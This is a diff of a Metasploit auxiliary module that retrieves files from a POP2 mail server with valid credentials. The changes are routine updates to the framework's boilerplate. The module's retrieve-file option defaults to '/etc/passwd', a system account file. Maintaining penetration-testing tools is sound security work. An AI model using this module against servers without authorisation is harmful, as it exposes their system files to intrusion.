@@ -1,14 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Pop2
 
   def initialize(info = {})
@@ -22,7 +17,7 @@ class Metasploit3 < Msf::Auxiliary
         be exploited with a valid username and password. The From address is
         the file owner.
       },
-      'Author'         => [ 'patrick' ],
+      'Author'         => [ 'aushack' ],
       'License'        => MSF_LICENSE,
       'References'     =>
         [
@@ -34,7 +29,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         OptString.new('FILE', [ true, "The file to retrieve", '/etc/passwd' ])
-      ], self.class)
+      ])
   end
 
   def run
@@ -54,5 +49,4 @@ class Metasploit3 < Msf::Auxiliary
     send_cmd( ['QUIT'] , true)
     disconnect
   end
-
 end
